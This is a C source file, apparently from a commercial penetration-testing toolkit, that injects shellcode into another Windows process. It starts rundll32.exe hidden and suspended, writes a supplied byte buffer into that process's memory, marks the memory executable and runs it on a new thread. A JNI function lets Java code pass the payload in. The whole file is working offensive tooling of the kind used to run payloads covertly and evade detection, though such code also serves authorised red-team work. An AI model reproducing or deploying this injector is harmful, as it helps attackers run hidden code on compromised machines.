/*
 * (c) 2012 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "injector.h"

void start_thread(HANDLE hProcess, PROCESS_INFORMATION pi, LPVOID lpStartAddress);

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject_process(HANDLE hProcess, PROCESS_INFORMATION pi, LPCVOID buffer, SIZE_T length) {
	LPVOID ptr;
	SIZE_T wrote;
	DWORD  old;

	/* allocate memory in our process */
	ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_READWRITE);

	/* write our shellcode to the process */
	WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
	if (wrote != length)
		return;

	/* change permissions */
	VirtualProtectEx(hProcess, ptr, length, PAGE_EXECUTE_READ, &old);

	/* create a thread in the process */
	start_thread(hProcess, pi, ptr);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess   = NULL;
	char lbuffer[1024];
	char cmdbuff[1024];

	/* reset some stuff */
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	/* start a process */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;

	/* resolve windir? */
	GetEnvironmentVariableA("windir", lbuffer, 1024);

	/* setup our path... choose wisely for 32bit and 64bit platforms */
	#ifdef _IS64_
	_snprintf(cmdbuff, 1024, "%s\\SysWOW64\\rundll32.exe", lbuffer);
	#else
	_snprintf(cmdbuff, 1024, "%s\\System32\\rundll32.exe", lbuffer);
	#endif

	/* spawn it baby! */
	if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		return;

	hProcess = pi.hProcess;
	if( !hProcess )
		return;

	inject_process(hProcess, pi, buffer, length);
}

JNIEXPORT void JNICALL Java_Main_inject(JNIEnv * env, jobject object, jbyteArray jdata) {
	jbyte * data = (*env)->GetByteArrayElements(env, jdata, 0);
	jsize length = (*env)->GetArrayLength(env, jdata);
	inject((LPCVOID)data, (SIZE_T)length);
	(*env)->ReleaseByteArrayElements(env, jdata, data, 0);
}
